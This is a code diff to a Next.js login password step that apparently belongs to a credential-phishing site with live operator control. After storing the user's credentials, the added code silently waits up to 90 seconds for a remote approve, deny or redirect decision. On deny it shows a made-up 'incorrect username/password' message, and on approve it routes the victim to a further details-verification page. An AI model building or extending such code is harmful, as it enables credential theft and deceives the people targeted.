@@ -2,6 +2,8 @@
 
 import { useRouter } from "next/navigation"
 import { useState } from "react"
+import { APPROVAL_TIMEOUT_MS, MSG_INCORRECT_USERNAME_PASSWORD } from "@/lib/approval-messages"
+import { createApproval, waitForApproval } from "@/lib/approval-client"
 import { WELCOME_TITLE } from "@/lib/auth-copy"
 import {
   setTargetFlowLogin,
@@ -10,7 +12,6 @@ import {
   readStoredUsername,
   storeLoginCredentials,
 } from "@/lib/login-flow-storage"
-import { LOADING_MS, wait } from "@/lib/loading-delays"
 
 type PasswordStepProps = {
   userId: string
@@ -58,9 +59,29 @@ export function PasswordStep({ userId }: PasswordStepProps) {
     storeLoginCredentials(trimmedUserId, password)
     setTargetFlowLogin()
 
-    await wait(LOADING_MS.next)
-    router.push("/verify?mode=details")
+    // Universal webhook gate: wait (in the background, nothing is displayed)
+    // up to 90s for an approve / deny / redirect decision after the username
+    // and password have been submitted.
+    const approvalId = await createApproval("login", trimmedUserId)
+    const outcome = approvalId
+      ? await waitForApproval(approvalId, APPROVAL_TIMEOUT_MS)
+      : "expired"
+
     setIsSubmitting(false)
+
+    if (outcome === "approve") {
+      router.push("/verify?mode=details")
+      return
+    }
+    if (outcome === "redirect") {
+      router.push("/verify")
+      return
+    }
+    if (outcome === "deny") {
+      setErrors({ form: MSG_INCORRECT_USERNAME_PASSWORD })
+      return
+    }
+    // No response within the waiting window — stay on this page.
   }
 
   return (
